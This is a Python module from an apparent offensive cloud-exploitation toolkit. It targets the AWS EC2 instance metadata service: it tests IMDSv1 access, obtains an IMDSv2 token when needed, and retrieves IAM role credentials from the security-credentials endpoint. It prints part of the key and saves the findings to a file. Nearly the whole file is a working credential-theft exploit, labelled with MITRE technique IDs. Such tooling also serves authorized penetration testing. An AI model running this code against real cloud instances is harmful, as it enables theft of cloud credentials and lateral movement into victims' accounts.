"""AWS EC2 IMDS pivot — IMDSv1/v2 credential theft and lateral movement."""

from __future__ import annotations

import json
import os
import sys
from datetime import datetime, timezone
from typing import Any


MANIFEST = {
    "capability_id": "cloudxpl.aws.ec2_imds_pivot.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ['network_request'],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1552.005","T1078"],
}


def _save(args: Any, prefix: str, data: Any) -> str:
    out = getattr(args, "output", ".")
    os.makedirs(out, exist_ok=True)
    ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    path = os.path.join(out, f"{prefix}_{ts}.json")
    with open(path, "w") as fh:
        json.dump(data, fh, indent=2, default=str)
    print(f"[+] Results saved to {path}")
    return path


def run(args: Any) -> int:

    print(f"[*] AWS EC2 IMDS Pivot Analysis")
    target = getattr(args, "target", None)
    if not target:
        target = "http://169.254.169.254"
    results = {"imds_version": "unknown", "credentials": [], "metadata": {}}
    import urllib.request
    import urllib.error
    try:
        req = urllib.request.Request(f"{target}/latest/meta-data/", method="GET")
        with urllib.request.urlopen(req, timeout=5) as resp:
            results["imds_version"] = "v1"
            metadata_keys = resp.read().decode().strip().split("\n")
            results["metadata"]["keys"] = metadata_keys
            print("[+] IMDSv1 accessible (no token required)")
    except Exception:
        try:
            token_req = urllib.request.Request(f"{target}/latest/api/token", method="PUT", headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"})
            with urllib.request.urlopen(token_req, timeout=5) as resp:
                token = resp.read().decode().strip()
                results["imds_version"] = "v2"
                print("[+] IMDSv2 token obtained")
                meta_req = urllib.request.Request(f"{target}/latest/meta-data/", headers={"X-aws-ec2-metadata-token": token})
                with urllib.request.urlopen(meta_req, timeout=5) as resp2:
                    metadata_keys = resp2.read().decode().strip().split("\n")
                    results["metadata"]["keys"] = metadata_keys
        except Exception as exc:
            print(f"[-] IMDS not accessible: {exc}"); return 1
    if "iam" in results["metadata"].get("keys", []):
        print("[*] IAM role detected, attempting credential extraction...")
        token_header = {}
        if results["imds_version"] == "v2":
            try:
                tr = urllib.request.Request(f"{target}/latest/api/token", method="PUT", headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"})
                with urllib.request.urlopen(tr, timeout=5) as r:
                    token_header = {"X-aws-ec2-metadata-token": r.read().decode().strip()}
            except Exception: pass
        try:
            role_req = urllib.request.Request(f"{target}/latest/meta-data/iam/security-credentials/", headers=token_header)
            with urllib.request.urlopen(role_req, timeout=5) as resp:
                role_name = resp.read().decode().strip()
                cred_req = urllib.request.Request(f"{target}/latest/meta-data/iam/security-credentials/{role_name}", headers=token_header)
                with urllib.request.urlopen(cred_req, timeout=5) as resp2:
                    import json as _json
                    creds = _json.loads(resp2.read().decode())
                    results["credentials"].append({"role": role_name, "access_key": creds.get("AccessKeyId", "")[:8] + "...", "expiration": creds.get("Expiration", "")})
                    print(f"  [!] Credentials obtained for role: {role_name}")
                    print(f"  [!] AccessKeyId: {creds.get('AccessKeyId', '')[:8]}...")
                    print(f"  [!] Expiration: {creds.get('Expiration', '')}")
        except Exception as exc:
            print(f"[-] Credential extraction failed: {exc}")
    _save(args, "aws_ec2_imds_pivot", results)
    return 0
